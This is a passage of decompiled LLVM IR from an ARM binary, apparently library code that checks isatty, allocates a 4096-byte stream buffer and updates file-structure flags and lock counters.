  br i1 %v1_17070, label %dec_label_pc_16f80, label %.dec_label_pc_1707c_crit_edge

.dec_label_pc_1707c_crit_edge:                    ; preds = %dec_label_pc_17058._crit_edge
  %v0_17080.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1707c

dec_label_pc_1707c:                               ; preds = %.dec_label_pc_1707c_crit_edge, %dec_label_pc_1704c
  %v0_17098 = phi i32 [ %v0_17080.pre, %.dec_label_pc_1707c_crit_edge ], [ %v2_17050, %dec_label_pc_1704c ]
  %v0_1707c = load i32, i32* @r5, align 4
  %v1_1707c = inttoptr i32 %v0_1707c to i16*
  %v2_1707c = load i16, i16* %v1_1707c, align 2
  %v3_1707c = zext i16 %v2_1707c to i32
  %v1_17080 = urem i32 %v0_17098, 4
  %v1_17084 = and i32 %v0_17098, 1024
  %v1_17088 = and i32 %v3_1707c, 8192
  %v1_1708c = add nuw nsw i32 %v1_17080, 1
  %v2_17090 = or i32 %v1_17088, %v1_17084
  store i32 %v2_17090, i32* %r3.global-to-local, align 4
  %v1_17094 = xor i32 %v1_1708c, 3
  %v1_17098 = and i32 %v0_17098, 131072
  store i32 %v1_17098, i32* %r2.global-to-local, align 4
  %v2_17098 = icmp eq i32 %v1_17098, 0
  %v1_1709c = add i32 %v0_1707c, 4
  %v2_1709c = inttoptr i32 %v1_1709c to i32*
  %v3_1709c = load i32, i32* %v2_1709c, align 4
  store i32 %v3_1709c, i32* @r4, align 4
  br i1 %v2_17098, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_1707c
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_1707c, %bb54
  %v0_170a8 = phi i32 [ 0, %dec_label_pc_1707c ], [ 32768, %bb54 ]
  %v4_170a4 = mul nuw nsw i32 %v1_17094, 16
  %v5_170a4 = or i32 %v2_17090, %v4_170a4
  store i32 %v5_170a4, i32* %r3.global-to-local, align 4
  %v2_170a8 = or i32 %v0_170a8, %v5_170a4
  store i32 %v2_170a8, i32* %r2.global-to-local, align 4
  %v2_170ac = icmp ugt i32 %v3_1709c, 2147483646
  store i1 %v2_170ac, i1* %cpsr_c.global-to-local, align 1
  %v8_170ac = icmp eq i32 %v3_1709c, 2147483647
  %v1_170b0 = trunc i32 %v2_170a8 to i16
  store i16 %v1_170b0, i16* %v1_1707c, align 2
  br i1 %v8_170ac, label %dec_label_pc_170f0, label %dec_label_pc_170b8

dec_label_pc_170b8:                               ; preds = %bb55
  store i32 49928, i32* %r3.global-to-local, align 4
  %v0_170bc = call i32 @__aeabi_read_tp()
  %v3_170c0 = load i16, i16* @global_var_233d0.483, align 2
  %v4_170c0 = sext i16 %v3_170c0 to i32
  store i32 %v4_170c0, i32* @r3, align 4
  store i32 %v0_170bc, i32* @r6, align 4
  %v0_170c8 = load i32, i32* @r4, align 4
  store i32 %v0_170c8, i32* @r0, align 4
  %v2_170cc = add i32 %v4_170c0, %v0_170bc
  %v3_170cc = inttoptr i32 %v2_170cc to i32*
  %v4_170cc = load i32, i32* %v3_170cc, align 4
  store i32 %v4_170cc, i32* @r4, align 4
  %v1_170d0 = call i32 @isatty(i32 %v0_170c8)
  store i32 %v1_170d0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_170d4 = icmp eq i32 %v1_170d0, 0
  br i1 %v2_170d4, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_170b8
  %v1_170d8 = load i32, i32* @r5, align 4
  %v2_170d8 = inttoptr i32 %v1_170d8 to i16*
  %v3_170d8 = load i16, i16* %v2_170d8, align 2
  %v4_170d8 = zext i16 %v3_170d8 to i32
  %v2_170dc = or i32 %v4_170d8, 256
  store i32 %v2_170dc, i32* %r3.global-to-local, align 4
  %v2_170e0 = trunc i32 %v2_170dc to i16
  store i16 %v2_170e0, i16* %v2_170d8, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_170b8, %bb56
  %v3_170e8 = load i16, i16* @global_var_233d0.483, align 2
  %v4_170e8 = sext i16 %v3_170e8 to i32
  store i32 %v4_170e8, i32* %r3.global-to-local, align 4
  %v0_170ec = load i32, i32* @r4, align 4
  %v1_170ec = load i32, i32* @r6, align 4
  %v3_170ec = add i32 %v1_170ec, %v4_170e8
  %v4_170ec = inttoptr i32 %v3_170ec to i32*
  store i32 %v0_170ec, i32* %v4_170ec, align 4
  br label %dec_label_pc_170f0

dec_label_pc_170f0:                               ; preds = %bb55, %.thread5
  %v0_170f0 = load i32, i32* @r5, align 4
  %v1_170f0 = add i32 %v0_170f0, 8
  %v2_170f0 = inttoptr i32 %v1_170f0 to i32*
  %v3_170f0 = load i32, i32* %v2_170f0, align 4
  store i32 %v3_170f0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_170f4 = icmp eq i32 %v3_170f0, 0
  br i1 %v2_170f4, label %dec_label_pc_170fc, label %bb57

dec_label_pc_170fc:                               ; preds = %dec_label_pc_170f0
  store i32 4096, i32* @r0, align 4
  %v0_17100 = call i32 @malloc()
  store i32 %v0_17100, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17104 = icmp eq i32 %v0_17100, 0
  %v1_17114.pre = load i32, i32* @r5, align 4
  br i1 %v2_17104, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_170fc
  %v2_17108 = inttoptr i32 %v1_17114.pre to i16*
  %v3_17108 = load i16, i16* %v2_17108, align 2
  %v4_17108 = zext i16 %v3_17108 to i32
  %v2_1710c = add i32 %v0_17100, 4096
  store i32 %v2_1710c, i32* %r2.global-to-local, align 4
  %v2_17110 = or i32 %v4_17108, 16384
  store i32 %v2_17110, i32* %r3.global-to-local, align 4
  %v2_17114 = add i32 %v1_17114.pre, 8
  %v3_17114 = inttoptr i32 %v2_17114 to i32*
  store i32 %v0_17100, i32* %v3_17114, align 4
  %v1_17118 = load i32, i32* %r2.global-to-local, align 4
  %v2_17118 = load i32, i32* @r5, align 4
  %v3_17118 = add i32 %v2_17118, 12
  %v4_17118 = inttoptr i32 %v3_17118 to i32*
  store i32 %v1_17118, i32* %v4_17118, align 4
  %v1_1711c = load i32, i32* %r3.global-to-local, align 4
  %v2_1711c = trunc i32 %v1_1711c to i16
  %v3_1711c = load i32, i32* @r5, align 4
  %v4_1711c = inttoptr i32 %v3_1711c to i16*
  store i16 %v2_1711c, i16* %v4_1711c, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_170fc
  %v2_1711437 = add i32 %v1_17114.pre, 8
  %v3_1711438 = inttoptr i32 %v2_1711437 to i32*
  store i32 0, i32* %v3_1711438, align 4
  %v2_17120 = load i32, i32* @r5, align 4
  %v3_17120 = add i32 %v2_17120, 12
  %v4_17120 = inttoptr i32 %v3_17120 to i32*
  store i32 0, i32* %v4_17120, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_170f0, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_1712c = load i32, i32* @r8, align 4
  %v2_1712c = add i32 %v0_1712c, 92
  %v3_1712c = inttoptr i32 %v2_1712c to i32*
  %v4_1712c = load i32, i32* %v3_1712c, align 4
  store i32 %v4_1712c, i32* %r3.global-to-local, align 4
  %v2_17130 = load i32, i32* @r5, align 4
  %v3_17130 = add i32 %v2_17130, 2
  %v4_17130 = inttoptr i32 %v3_17130 to i8*
  store i8 0, i8* %v4_17130, align 1
  %v0_17134 = load i32, i32* @r5, align 4
  %v1_17134 = inttoptr i32 %v0_17134 to i16*
  %v2_17134 = load i16, i16* %v1_17134, align 2
  %v3_17134 = zext i16 %v2_17134 to i32
  store i32 %v3_17134, i32* %r2.global-to-local, align 4
  %v0_17138 = load i32, i32* %r3.global-to-local, align 4
  %v1_17138 = inttoptr i32 %v0_17138 to i32*
  %v2_17138 = load i32, i32* %v1_17138, align 4
  store i32 %v2_17138, i32* @r1, align 4
  %v1_1713c = add i32 %v0_17134, 8
  %v2_1713c = inttoptr i32 %v1_1713c to i32*
  %v3_1713c = load i32, i32* %v2_1713c, align 4
  store i32 %v3_1713c, i32* %r3.global-to-local, align 4
  %v1_17140 = and i32 %v3_17134, 8192
  %v2_17140 = icmp eq i32 %v1_17140, 0
  %v2_17144 = add i32 %v0_17134, 20
  %v3_17144 = inttoptr i32 %v2_17144 to i32*
  store i32 %v3_1713c, i32* %v3_17144, align 4
  %v0_17148 = load i32, i32* @r1, align 4
  %v1_17148 = load i32, i32* @r5, align 4
  %v2_17148 = add i32 %v1_17148, 52
  %v3_17148 = inttoptr i32 %v2_17148 to i32*
  store i32 %v0_17148, i32* %v3_17148, align 4
  %v0_1714c = load i32, i32* %r3.global-to-local, align 4
  %v1_1714c = load i32, i32* @r5, align 4
  %v2_1714c = add i32 %v1_1714c, 24
  %v3_1714c = inttoptr i32 %v2_1714c to i32*
  store i32 %v0_1714c, i32* %v3_1714c, align 4
  %v0_17150 = load i32, i32* %r3.global-to-local, align 4
  %v1_17150 = load i32, i32* @r5, align 4
  %v2_17150 = add i32 %v1_17150, 28
  %v3_17150 = inttoptr i32 %v2_17150 to i32*
  store i32 %v0_17150, i32* %v3_17150, align 4
  %v0_17154 = load i32, i32* %r3.global-to-local, align 4
  %v1_17154 = load i32, i32* @r5, align 4
  %v2_17154 = add i32 %v1_17154, 16
  %v3_17154 = inttoptr i32 %v2_17154 to i32*
  store i32 %v0_17154, i32* %v3_17154, align 4
  %v0_17158 = load i32, i32* %r4.global-to-local, align 4
  %v1_17158 = load i32, i32* @r5, align 4
  %v2_17158 = add i32 %v1_17158, 44
  %v3_17158 = inttoptr i32 %v2_17158 to i32*
  store i32 %v0_17158, i32* %v3_17158, align 4
  br i1 %v2_17140, label %dec_label_pc_17340, label %dec_label_pc_17160

dec_label_pc_17160:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17164 = load i32, i32* @r8, align 4
  %v2_17164 = add i32 %v0_17164, 160
  %v3_17164 = inttoptr i32 %v2_17164 to i32*
  %v4_17164 = load i32, i32* %v3_17164, align 4
  store i32 %v4_17164, i32* %r7.global-to-local, align 4
  %v0_17168 = call i32 @__aeabi_read_tp()
  store i32 %v0_17168, i32* %r0.global-to-local, align 4
  %v1_1716c = add i32 %v4_17164, 8
  %v2_1716c = inttoptr i32 %v1_1716c to i32*
  %v3_1716c = load i32, i32* %v2_1716c, align 4
  store i32 %v3_1716c, i32* %r3.global-to-local, align 4
  %v1_17170 = add i32 %v0_17168, -1168
  store i32 %v1_17170, i32* %r6.global-to-local, align 4
  %v3_17174 = icmp uge i32 %v3_1716c, %v1_17170
  store i1 %v3_17174, i1* %cpsr_c.global-to-local, align 1
  %v9_17174 = icmp eq i32 %v3_1716c, %v1_17170
  br i1 %v9_17174, label %dec_label_pc_171b8, label %dec_label_pc_1717c

dec_label_pc_1717c:                               ; preds = %dec_label_pc_17160
  store i32 %v4_17164, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17184

dec_label_pc_17184:                               ; preds = %dec_label_pc_17190.dec_label_pc_17184_crit_edge, %dec_label_pc_1717c
  %v0_17184 = phi i32 [ %v0_17184.pre, %dec_label_pc_17190.dec_label_pc_17184_crit_edge ], [ %v4_17164, %dec_label_pc_1717c ]
  %v1_17184 = inttoptr i32 %v0_17184 to i32*
  %v2_17184 = load i32, i32* %v1_17184, align 4
  store i32 %v2_17184, i32* %r3.global-to-local, align 4
  %v1_17188 = load i32, i32* %r4.global-to-local, align 4
  %v3_17188 = icmp uge i32 %v2_17184, %v1_17188
  store i1 %v3_17188, i1* %cpsr_c.global-to-local, align 1
  %v9_17188 = icmp eq i32 %v2_17184, %v1_17188
  br i1 %v9_17188, label %dec_label_pc_17190, label %dec_label_pc_171a8

dec_label_pc_17190:                               ; preds = %dec_label_pc_17184
  store i32 %v2_17184, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_171a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_171a0, label %dec_label_pc_171a4, label %dec_label_pc_17190.dec_label_pc_17184_crit_edge

dec_label_pc_17190.dec_label_pc_17184_crit_edge:  ; preds = %dec_label_pc_17190
  %v0_17184.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17184

dec_label_pc_171a4:                               ; preds = %dec_label_pc_17190
  %v0_171a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_171a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_171a8

dec_label_pc_171a8:                               ; preds = %dec_label_pc_17184, %dec_label_pc_171a4
  %v0_171a8 = phi i32 [ %v0_171a4, %dec_label_pc_171a4 ], [ %v2_17184, %dec_label_pc_17184 ]
  %v1_171a8 = phi i32 [ %v0_171a4, %dec_label_pc_171a4 ], [ %v1_17188, %dec_label_pc_17184 ]
  %v3_171a8 = icmp uge i32 %v0_171a8, %v1_171a8
  store i1 %v3_171a8, i1* %cpsr_c.global-to-local, align 1
  %v9_171a8 = icmp eq i32 %v0_171a8, %v1_171a8
  br i1 %v9_171a8, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_171a8
  %v1_171ac = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_171ac, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_171a8, %bb58
  %v1_171b0 = xor i1 %v9_171a8, true
  call void @__pseudo_cond_branch(i1 %v1_171b0, i32 ptrtoint (i32* @global_var_15400.643 to i32))
  %v0_171b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_171b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_171b4 = add i32 %v1_171b4, 8
  %v3_171b4 = inttoptr i32 %v2_171b4 to i32*
  store i32 %v0_171b4, i32* %v3_171b4, align 4
  %v1_171d4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_171b8

dec_label_pc_171b8:                               ; preds = %dec_label_pc_17160, %bb59
  %v1_171d4 = phi i32 [ %v3_1716c, %dec_label_pc_17160 ], [ %v1_171d4.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_171bc = load i32, i32* @r8, align 4
  %v2_171bc = add i32 %v0_171bc, 160
  %v3_171bc = inttoptr i32 %v2_171bc to i32*
  %v4_171bc = load i32, i32* %v3_171bc, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_171c4 = add i32 %v0_171bc, 152
  %v3_171c4 = inttoptr i32 %v2_171c4 to i32*
  %v4_171c4 = load i32, i32* %v3_171c4, align 4
  store i32 %v4_171c4, i32* %r7.global-to-local, align 4
  %v1_171c8 = add i32 %v4_171bc, 4
  %v2_171c8 = inttoptr i32 %v1_171c8 to i32*
  %v3_171c8 = load i32, i32* %v2_171c8, align 4
  store i32 %v3_171c8, i32* %r3.global-to-local, align 4
  %v1_171cc = add i32 %v4_171c4, 8
  %v2_171cc = inttoptr i32 %v1_171cc to i32*
  %v3_171cc = load i32, i32* %v2_171cc, align 4
  store i32 %v3_171cc, i32* %r2.global-to-local, align 4
  %v1_171d0 = add i32 %v3_171c8, 1
  store i32 %v1_171d0, i32* %r3.global-to-local, align 4
  %v3_171d4 = icmp uge i32 %v3_171cc, %v1_171d4
  store i1 %v3_171d4, i1* %cpsr_c.global-to-local, align 1
  %v9_171d4 = icmp eq i32 %v3_171cc, %v1_171d4
  store i32 %v1_171d0, i32* %v2_171c8, align 4
  br i1 %v9_171d4, label %dec_label_pc_17220, label %dec_label_pc_171e0

dec_label_pc_171e0:                               ; preds = %dec_label_pc_171b8
  %v0_171e4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_171e4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_171ec95 = inttoptr i32 %v0_171e4 to i32*
  %v2_171ec96 = load i32, i32* %v1_171ec95, align 4
  store i32 %v2_171ec96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_171f098 = icmp eq i32 %v2_171ec96, 0
  br i1 %v9_171f098, label %dec_label_pc_171f8, label %dec_label_pc_17210

dec_label_pc_171f8:                               ; preds = %dec_label_pc_171e0, %dec_label_pc_171f8.dec_label_pc_171ec_crit_edge
  %v0_171f899 = phi i32 [ %v1_171f0.pre, %dec_label_pc_171f8.dec_label_pc_171ec_crit_edge ], [ 0, %dec_label_pc_171e0 ]
  store i32 %v0_171f899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17208 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17208, label %dec_label_pc_1720c, label %dec_label_pc_171f8.dec_label_pc_171ec_crit_edge

dec_label_pc_171f8.dec_label_pc_171ec_crit_edge:  ; preds = %dec_label_pc_171f8
  %v0_171ec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_171f0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_171ec = inttoptr i32 %v0_171ec.pre to i32*
  %v2_171ec = load i32, i32* %v1_171ec, align 4
  store i32 %v2_171ec, i32* %r3.global-to-local, align 4
  %v3_171f0 = icmp uge i32 %v2_171ec, %v1_171f0.pre
  store i1 %v3_171f0, i1* %cpsr_c.global-to-local, align 1
  %v9_171f0 = icmp eq i32 %v2_171ec, %v1_171f0.pre
  br i1 %v9_171f0, label %dec_label_pc_171f8, label %dec_label_pc_17210

dec_label_pc_1720c:                               ; preds = %dec_label_pc_171f8
  %v0_1720c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1720c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17210

dec_label_pc_17210:                               ; preds = %dec_label_pc_171e0, %dec_label_pc_171f8.dec_label_pc_171ec_crit_edge, %dec_label_pc_1720c
  %v0_17210 = phi i32 [ %v0_1720c, %dec_label_pc_1720c ], [ %v2_171ec96, %dec_label_pc_171e0 ], [ %v2_171ec, %dec_label_pc_171f8.dec_label_pc_171ec_crit_edge ]
  %v1_17210 = phi i32 [ %v0_1720c, %dec_label_pc_1720c ], [ 0, %dec_label_pc_171e0 ], [ %v1_171f0.pre, %dec_label_pc_171f8.dec_label_pc_171ec_crit_edge ]
  %v3_17210 = icmp uge i32 %v0_17210, %v1_17210
  store i1 %v3_17210, i1* %cpsr_c.global-to-local, align 1
  %v9_17210 = icmp eq i32 %v0_17210, %v1_17210
  br i1 %v9_17210, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_17210
  %v1_17214 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_17214, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_17210, %bb60
  %v1_17218 = xor i1 %v9_17210, true
  call void @__pseudo_cond_branch(i1 %v1_17218, i32 ptrtoint (i32* @global_var_15400.643 to i32))
  %v0_1721c = load i32, i32* %r6.global-to-local, align 4
  %v1_1721c = load i32, i32* %r7.global-to-local, align 4
  %v2_1721c = add i32 %v1_1721c, 8
  %v3_1721c = inttoptr i32 %v2_1721c to i32*
  store i32 %v0_1721c, i32* %v3_1721c, align 4
  br label %dec_label_pc_17220

dec_label_pc_17220:                               ; preds = %dec_label_pc_171b8, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_17224 = load i32, i32* @r8, align 4
  %v2_17224 = add i32 %v0_17224, 152
  %v3_17224 = inttoptr i32 %v2_17224 to i32*
  %v4_17224 = load i32, i32* %v3_17224, align 4
  store i32 %v4_17224, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_1722c = add i32 %v0_17224, 76
  %v3_1722c = inttoptr i32 %v2_1722c to i32*
  %v4_1722c = load i32, i32* %v3_1722c, align 4
  store i32 %v4_1722c, i32* @r1, align 4
  %v1_17230 = add i32 %v4_17224, 4
  %v2_17230 = inttoptr i32 %v1_17230 to i32*
  %v3_17230 = load i32, i32* %v2_17230, align 4
  store i32 %v3_17230, i32* %r3.global-to-local, align 4
  %v1_17234 = inttoptr i32 %v4_1722c to i32*
  %v2_17234 = load i32, i32* %v1_17234, align 4
  store i32 %v2_17234, i32* %r2.global-to-local, align 4
  %v1_17238 = add i32 %v3_17230, 1
  store i32 %v1_17238, i32* %r3.global-to-local, align 4
  store i32 %v1_17238, i32* %v2_17230, align 4
  %v0_17240 = load i32, i32* %r2.global-to-local, align 4
  %v1_17240 = load i32, i32* @r5, align 4
  %v2_17240 = add i32 %v1_17240, 32
  %v3_17240 = inttoptr i32 %v2_17240 to i32*
  store i32 %v0_17240, i32* %v3_17240, align 4
  %v0_17244 = load i32, i32* %r0.global-to-local, align 4
  %v1_17244 = add i32 %v0_17244, 4
  %v2_17244 = inttoptr i32 %v1_17244 to i32*
  %v3_17244 = load i32, i32* %v2_17244, align 4
  %v1_17248 = add i32 %v3_17244, -1
  store i32 %v1_17248, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1724c = icmp eq i32 %v1_17248, 0
  %v0_17250 = load i32, i32* @r5, align 4
  %v1_17250 = load i32, i32* @r1, align 4
  %v2_17250 = inttoptr i32 %v1_17250 to i32*
  store i32 %v0_17250, i32* %v2_17250, align 4
  %v0_17254 = load i32, i32* %r3.global-to-local, align 4
  %v1_17254 = load i32, i32* %r0.global-to-local, align 4
  %v2_17254 = add i32 %v1_17254, 4
  %v3_17254 = inttoptr i32 %v2_17254 to i32*
  store i32 %v0_17254, i32* %v3_17254, align 4
  br i1 %v2_1724c, label %dec_label_pc_1725c, label %dec_label_pc_172bc

dec_label_pc_1725c:                               ; preds = %dec_label_pc_17220
  %v0_1725c = load i32, i32* %r3.global-to-local, align 4
  %v1_1725c = load i32, i32* %r0.global-to-local, align 4
  %v2_1725c = add i32 %v1_1725c, 8
  %v3_1725c = inttoptr i32 %v2_1725c to i32*
  store i32 %v0_1725c, i32* %v3_1725c, align 4
  %v0_17260 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17260, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17264

dec_label_pc_17264:                               ; preds = %dec_label_pc_17294.dec_label_pc_17264_crit_edge, %dec_label_pc_1725c
  %v0_17264 = phi i32 [ %v0_17264.pre, %dec_label_pc_17294.dec_label_pc_17264_crit_edge ], [ %v0_17260, %dec_label_pc_1725c ]
  %v1_17264 = inttoptr i32 %v0_17264 to i32*
  %v2_17264 = load i32, i32* %v1_17264, align 4
  store i32 %v2_17264, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_17264, i32* %r2.global-to-local, align 4
  %v2_1727083 = load i32, i32* %v1_17264, align 4
  store i32 %v2_1727083, i32* %r3.global-to-local, align 4
  %v3_1727485 = icmp uge i32 %v2_1727083, %v2_17264
  store i1 %v3_1727485, i1* %cpsr_c.global-to-local, align 1
  %v9_1727491 = icmp eq i32 %v2_1727083, %v2_17264
  br i1 %v9_1727491, label %dec_label_pc_1727c, label %dec_label_pc_17294

dec_label_pc_1727c:                               ; preds = %dec_label_pc_17264, %dec_label_pc_1727c.dec_label_pc_17270_crit_edge
  %v0_1727c92 = phi i32 [ %v1_17274.pre, %dec_label_pc_1727c.dec_label_pc_17270_crit_edge ], [ %v2_17264, %dec_label_pc_17264 ]
  store i32 %v0_1727c92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1728c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1728c, label %dec_label_pc_17290, label %dec_label_pc_1727c.dec_label_pc_17270_crit_edge

dec_label_pc_1727c.dec_label_pc_17270_crit_edge:  ; preds = %dec_label_pc_1727c
  %v0_17270.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17274.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17270 = inttoptr i32 %v0_17270.pre to i32*
  %v2_17270 = load i32, i32* %v1_17270, align 4
  store i32 %v2_17270, i32* %r3.global-to-local, align 4
  %v3_17274 = icmp uge i32 %v2_17270, %v1_17274.pre
  store i1 %v3_17274, i1* %cpsr_c.global-to-local, align 1
  %v9_17274 = icmp eq i32 %v2_17270, %v1_17274.pre
  br i1 %v9_17274, label %dec_label_pc_1727c, label %dec_label_pc_17294

dec_label_pc_17290:                               ; preds = %dec_label_pc_1727c
  %v0_17290 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17290, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17294

dec_label_pc_17294:                               ; preds = %dec_label_pc_17264, %dec_label_pc_1727c.dec_label_pc_17270_crit_edge, %dec_label_pc_17290
  %v0_1729c = phi i32 [ %v0_17290, %dec_label_pc_17290 ], [ %v2_1727083, %dec_label_pc_17264 ], [ %v2_17270, %dec_label_pc_1727c.dec_label_pc_17270_crit_edge ]
  %v1_17294 = phi i32 [ %v0_17290, %dec_label_pc_17290 ], [ %v2_17264, %dec_label_pc_17264 ], [ %v1_17274.pre, %dec_label_pc_1727c.dec_label_pc_17270_crit_edge ]
  %v3_17294 = icmp uge i32 %v0_1729c, %v1_17294
  store i1 %v3_17294, i1* %cpsr_c.global-to-local, align 1
  %v9_17294 = icmp eq i32 %v0_1729c, %v1_17294
  br i1 %v9_17294, label %dec_label_pc_1729c, label %dec_label_pc_17294.dec_label_pc_17264_crit_edge

dec_label_pc_17294.dec_label_pc_17264_crit_edge:  ; preds = %dec_label_pc_17294
  %v0_17264.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17264

dec_label_pc_1729c:                               ; preds = %dec_label_pc_17294
  %v2_1729c = icmp ne i32 %v1_17294, 0
  store i1 %v2_1729c, i1* %cpsr_c.global-to-local, align 1
  %v7_172a0 = icmp slt i32 %v1_17294, 2
  br i1 %v7_172a0, label %dec_label_pc_172bc, label %dec_label_pc_172a4

dec_label_pc_172a4:                               ; preds = %dec_label_pc_1729c
  %v0_172a4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_172a4, i32* %r0.global-to-local, align 4
  %v0_172a8 = load i32, i32* @r1, align 4
  %v1_172a8 = add i32 %v0_172a8, 129
  store i32 %v1_172a8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_172bc

dec_label_pc_172bc:                               ; preds = %dec_label_pc_17220, %dec_label_pc_172a4, %dec_label_pc_1729c
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_172c0 = load i32, i32* @r8, align 4
  %v2_172c0 = add i32 %v0_172c0, 160
  %v3_172c0 = inttoptr i32 %v2_172c0 to i32*
  %v4_172c0 = load i32, i32* %v3_172c0, align 4
  store i32 %v4_172c0, i32* %r0.global-to-local, align 4
  %v1_172c4 = add i32 %v4_172c0, 4
  %v2_172c4 = inttoptr i32 %v1_172c4 to i32*
  %v3_172c4 = load i32, i32* %v2_172c4, align 4
  %v1_172c8 = add i32 %v3_172c4, -1
  store i32 %v1_172c8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_172cc = icmp eq i32 %v1_172c8, 0
  store i32 %v1_172c8, i32* %v2_172c4, align 4
  br i1 %v2_172cc, label %dec_label_pc_172d8, label %dec_label_pc_17340

dec_label_pc_172d8:                               ; preds = %dec_label_pc_172bc
  %v0_172d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_172d8 = load i32, i32* %r0.global-to-local, align 4
  %v2_172d8 = add i32 %v1_172d8, 8
  %v3_172d8 = inttoptr i32 %v2_172d8 to i32*
  store i32 %v0_172d8, i32* %v3_172d8, align 4
  %v0_172dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_172dc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_172e0

dec_label_pc_172e0:                               ; preds = %dec_label_pc_17310.dec_label_pc_172e0_crit_edge, %dec_label_pc_172d8
  %v0_172e0 = phi i32 [ %v0_172e0.pre, %dec_label_pc_17310.dec_label_pc_172e0_crit_edge ], [ %v0_172dc, %dec_label_pc_172d8 ]
  %v1_172e0 = inttoptr i32 %v0_172e0 to i32*
  %v2_172e0 = load i32, i32* %v1_172e0, align 4
  store i32 %v2_172e0, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_172e0, i32* %r2.global-to-local, align 4
  %v2_172ec71 = load i32, i32* %v1_172e0, align 4
  store i32 %v2_172ec71, i32* %r3.global-to-local, align 4
  %v3_172f073 = icmp uge i32 %v2_172ec71, %v2_172e0
  store i1 %v3_172f073, i1* %cpsr_c.global-to-local, align 1
  %v9_172f079 = icmp eq i32 %v2_172ec71, %v2_172e0
  br i1 %v9_172f079, label %dec_label_pc_172f8, label %dec_label_pc_17310

dec_label_pc_172f8:                               ; preds = %dec_label_pc_172e0, %dec_label_pc_172f8.dec_label_pc_172ec_crit_edge
  %v0_172f880 = phi i32 [ %v1_172f0.pre, %dec_label_pc_172f8.dec_label_pc_172ec_crit_edge ], [ %v2_172e0, %dec_label_pc_172e0 ]
  store i32 %v0_172f880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17308 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17308, label %dec_label_pc_1730c, label %dec_label_pc_172f8.dec_label_pc_172ec_crit_edge

dec_label_pc_172f8.dec_label_pc_172ec_crit_edge:  ; preds = %dec_label_pc_172f8
